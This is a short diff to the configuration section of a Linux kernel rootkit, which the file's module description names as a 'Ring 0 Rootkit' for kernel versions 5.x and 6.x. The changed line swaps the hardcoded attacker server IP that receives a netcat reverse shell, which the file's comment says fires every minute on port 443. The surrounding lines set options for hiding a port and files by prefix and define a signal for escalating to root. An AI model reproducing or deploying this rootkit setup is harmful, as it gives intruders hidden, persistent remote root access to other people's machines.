@@ -32,7 +32,7 @@ MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");
 #define HIDE_PORT 1234              // TCP and UDP port to hide (only netstat & lsof)
 #define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
 //==========[REVERSE SHELL]=========//
-#define YOUR_SRV_IP "109.120.179.45"     // IP address of your server to receive the shell via netcat (executes every 1 minute)
+#define YOUR_SRV_IP "150.241.91.206"     // IP address of your server to receive the shell via netcat (executes every 1 minute)
 #define YOUR_SRV_PORT 443          // port where you will receive the shell
 //==================================//
 #define SIGUSR1 10                  // user2root signal
